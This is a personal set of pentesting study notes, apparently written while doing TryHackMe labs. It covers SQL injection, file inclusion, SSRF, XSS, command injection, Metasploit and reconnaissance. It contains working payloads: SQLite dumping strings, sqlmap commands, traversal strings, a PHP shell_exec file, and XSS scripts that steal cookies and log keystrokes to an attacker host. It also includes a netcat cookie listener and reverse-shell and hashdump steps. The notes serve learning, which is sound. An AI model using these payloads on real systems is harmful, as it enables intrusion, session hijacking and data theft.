# R

* Remember for web/general/security

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
  * https://ipinfo.io/
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)

<hr class="sep-both">

# Learn again

* netdiscover
* https://www.sans.org/cyberaces/

<hr class="sep-both">

# SQL

* Input Box String: usual
* Input Box Non-String: when there is no quotes: `'' OR 1=1-- -`
* If you have trouble via a form (client-side verification) intercept the request
* Look into the field name to guess column names
* Update
  * none',nickName='lol
* Version
  * (SELECT banner FROM v$version)
  * sqlite_version()
    * SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
    * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
    * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
    * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
* https://www.kirsle.net/wizards/flask-session.cgi
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin"
  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
* https://tryhackme.com/room/sqlilab
* See tamper script
* Imagine website injectable parameter toLowerCase the parameter.

<hr class="sep-both">

## Burp

* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
* tabs per request

<hr class="sep-both">

# weeb

* https://www.base64decode.org/
* https://www.base64encode.org/
* IDOR: if accounts are unpredictable, try making two accounts, and test if you can swap with both.
* URL/source code, scripts (see network tab)...
* https://canitakeyoursubdomain.name/
* https://secalerts.co/
* https://stack.watch/
* File inclusion
  * Local File Inclusion (LFI)
    * someone make a require/import of something fetched by the user, such as LANG (ex with `$_GET["lang"]`)
    * if there are error messages, it's easy to get the path good
    * Null Byte (< PHP 5.3.4, expecting EN -> EN.php, then "EN%00" or "EN0x00" ignore the ".php")
    * `/etc/passwd%00` (bypass simple filters)
    * `....//` (bypass filter with `../` as PHP will not replace the output)
    * it's also possible that the dev force the files to be in a folder, but we simply need to make a path starting with this folder then
  * Remote File Inclusion (RFI)
    * inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on
  * Path/Directory traversal: manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory
    * file_get_contents in PHP
    * ../[...]/etc/passwd (dot-dot-slash attack)
    * ../[...]/windows/win.ini
    * It may be worth noting that the root, it its own parent, so if you don't know the path of the server, you can still get add way more "../" than needed, and add a path starting from the root.
    * https://tryhackme.com/room/fileinc (common files)
* https://tryhackme.com/room/fileinc > Remediation
* https://tryhackme.com/room/fileinc > Common steps
* https://tryhackme.com/room/fileinc
  * curl 'http://10.10.187.94/challenges/chall1.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'file=/etc/flag1' 
  * Cookie, with a username, but it could be a file instead (:
  * The server uses $_REQUEST, so even if $_GET is filtered, we can get in, but it's kinda special for a setting
  * python -m http.server
  * http://10.13.3.244:8000/file

```php
<?php

echo shell_exec("hostname");
```

* SSRF Server-Side Request Forgery
  * Exploit a server to make a request to another services, that could be located on another machine, to look for a resource usually of the attacker's choosing
    * Regular SSRF: the client see the result
    * Blind SSRF: no information returned
  * Can be used to access/map internal/inaccessible areas
  * `a?api=path` -> `b/path`
  * `a?server=my?x=&api=path` -> `server?x=original_server/path`
    * if we manage to redirect the traffic to our domain
    * we could get some credentials (ex: API keys) in the headers
  * Look at
    * URL (full URL, or partial, or a path)
    * forms

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

* deny list or an allow list
  * Such as deny access to localhost which may contain server performance data or further sensitive information, bypass 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
  * 169.254.169.254.may contains sensitive data in cloud environments
  * Allow List: allows those starting with "https://xxx.com", but you could make a domain name giving us "https://xxx.com.virus.com"
* An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.
* A form with profile images: give a path in it
* https://tryhackme.com/room/ssrfqi

* https://tryhackme.com/room/xssgi
* XSS / Cross-site Scripting
  * malicious JavaScript gets injected into a web application with the intention of being executed by other users
  * Proof Of Concept `<script>alert('XSS');</script>`
  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
  * Business Logic: call something that the user would be able to call from its browser, such as an API using the client credentials
* **Reflected XSS**: in the parameters of a request, the page may execute the JavaScript payload
* **Stored XSS**: store by the application, and displayed by the website (comments, profiles, listings...). Anything where the user could input something malicious.
  * Some developers are not filtering everything. Dropdown for your age, you enter XSS, boom (the database query would fail for a int).
* **DOM Based XSS** https://tryhackme.com/room/xssgi
* **Blind XSS**: you can't see if the payload is working (ex: the admin-side website if any): hackers use a callback (https://xsshunter.com/ https://github.com/mandatoryprogrammer/xsshunter https://github.com/mandatoryprogrammer/xsshunter-express)
* If inside an input `">PoC`
* If inside a textarea `<textarea/>POC`
* If inside some javascript string `';alert('XSS');//`
* Bypass filter `<sscriptcript>alert('XSS');</sscriptcript>`
* If "<" are filtered, but we are inside a tag, then we may use functions such as "onload"...

```
Polyglots:

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

* nc -nlvp 9001 (listen) -> steal cookie
* `fetch('http://ip:9001?cookie=' + btoa(document.cookie));`

---

* Remote Code Execution (RCE) - command injection => goal: get a reverse shell
* https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report
  * Example: a code that call a command (ex: grep) using user input
* Blind
  * Force input: >, -o...
  * Time-based: ping/sleep
* Regular
* Commands
  * L: whoami id nc
  * W: whoami dir ping timeout
* sanitisation = check the format (ex: number, email...). Filters can be bypassed (ex: hexadecimal...).
* https://github.com/payloadbox/command-injection-payload-list

<hr class="sep-both">

## MSF

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the `search portscan`

* `auxiliary/scanner/portscan/tcp` (TCP port scan)
* `scanner/discovery/udp_sweep` (UDP services)
* `auxiliary/scanner/smb/smb_version` (SMB Scans)
* `auxiliary/scanner/http/http_version` (HTTP version)
* `auxiliary/scanner/smb/smb_login`: bruteforce SMB
* you can write "use xxx" if there is only one xxx

XXX

* Start the database: `sudo systemctl start postgresql` (See commands for Nessus, move them)
* workspace
  * workspace -a xxx
  * workspace xxx
  * workspace -d xxx
* `db_nmap`: execute and store nmap result
* `hosts`
* `services`
* `hosts -R`: add all ips to RHOSTS
* `services -S netbios`: search a service

----

You may want to look for low-hanging fruits such as:
HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
FTP: Could allow anonymous login and provide access to interesting files.
SMB: Could be vulnerable to SMB exploits like MS17-010
SSH: Could have default or easy to guess credentials
RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

----

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

----

* https://tryhackme.com/room/metasploitexploitation msfvenom
* Linux
  * getuid
  * sysinfo
  * shell (open a sh shell)
  * run exploits ok
* sudo ./reverse_shell.elf

```
> bg
# must be root
> use post/linux/gather/hashdump
> set SESSION 1
> run
```

<hr class="sep-both">

## Recon

* whois to query WHOIS servers
  * Registrar -> find more about it
  * Contact info
  * ...
* nslookup to query DNS servers
  * nslookup -type=A tryhackme.com 1.1.1.1
* dig to query DNS servers
* DNSDumpster / https://dnsdumpster.com/
  * ...
* Shodan.io : a browser indexing devices and their information
  * https://www.shodan.io/
  * https://help.shodan.io/the-basics/search-query-fundamentals
  * https://tryhackme.com/room/shodan
  * can see the top ports for apache...
* https://www.unifiedkillchain.com/
* Passive reconnaissance activities
  * Looking up DNS records of a domain from a public DNS server. 
  * Checking job ads related to the target website. 
  * Reading news articles about the target company.
* https://tryhackme.com/room/passiverecon

----
https://tryhackme.com/room/protocolsandservers
https://tryhackme.com/room/protocolsandservers2
----

* https://tryhackme.com/room/activerecon
* active reconnaissance activities
  * Connecting to one of the company servers such as HTTP, FTP, and SMTP. 
  * Calling the company in an attempt to get information (social engineering). 
  * Entering company premises pretending to be a repairman.
* ping, traceroute, telnet, and nc
  * ping: We learned that X is up and is not blocking ICMP echo requests.
  * traceroute command traces the route taken by the packets. This command also reveals the number of routers between the two systems. It is helpful as it indicates the number of hops (routers) between your system and the target host. However, note that the route taken by the packets might change as many routers use dynamic routing protocols that adapt to network changes. tracert on Windows. if the TTL reaches 0, it will be dropped, and an ICMP Time-to-Live exceeded would be sent to the original sender. Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
    Some routers don’t return a reply.
  * telnet: The TELNET (Teletype Network) protocol was developed in 1969 to communicate with a remote system via a command-line interface (CLI). Hence, the command telnet uses the TELNET protocol for remote administration. The default port used by telnet is 23. From a security perspective, telnet sends all the data, including usernames and passwords, in cleartext. Sending in cleartext makes it easy for anyone, who has access to the communication channel, to steal the login credentials. The secure alternative is SSH (Secure SHell) protocol.
    * `telnet X 80`
    * `GET / HTTP/2<CR>Host: xxx<CR><CR>` but >> `curl -I 10.10.233.54:80`
  * Netcatp same as telnet but TCP, and UDP. `nc 10.10.127.12 80`
  * 
```
-v	Verbose output (optional, yet useful to discover any bugs)
-vv	Very Verbose (optional)
-k	Keep listening after client disconnects

nc X 21
    220 debra2.thm.local FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
```

The Telnet protocol is an application layer protocol used to connect to a virtual terminal of another computer. Using Telnet, a user can log into another computer and access its terminal (console) to run programs, start batch processes, and perform system administration tasks remotely.

Telnet protocol is relatively simple. When a user connects, they will be asked for a username and password. Upon correct authentication, the user will access the remote system’s terminal. Unfortunately, all this communication between the Telnet client and the Telnet server is not encrypted, making it an easy target for attackers.

Port 23

* browser

User-Agent Switcher and Manager gives you the ability to pretend to be accessing the webpage from a different operating system or different web browser. In other words, you can pretend to be browsing a site using an iPhone when in fact, you are accessing it from Mozilla Firefox. 

---

HTTP
FTP

USER xxx
PASS yyy

A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.
The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

2 channels: commands, and a new tcp connection to transfer data.

ascii

ftp> syst
215 UNIX Type: L8
ftp> stat
Connected and logged into 10.10.208.209.
No proxy connection.
Gate ftp: off, server (none), port ftpgate.
Passive mode: on; fallback to active mode: on.
Mode: stream; Type: binary; Form: non-print; Structure: file.
Verbose: on; Bell: off; Prompting: on; Globbing: on.
Store unique: off; Receive unique: off.
Preserve modification times: on.
Case: off; CR stripping: on.
Ntrans: off.
Nmap: off.
Hash mark printing: off; Mark count: 1024; Progress bar: on.
Get transfer rate throttle: off; maximum: 0; increment 1024.
Put transfer rate throttle: off; maximum: 0; increment 1024.
Socket buffer sizes: send 16384, receive 131072.
Use of PORT cmds: on.
Use of EPSV/EPRT cmds for IPv4: on.
Use of EPSV/EPRT cmds for IPv6: on.
Command line editing: on.
Version: tnftp 20210827

POP3
SMTP
IMAP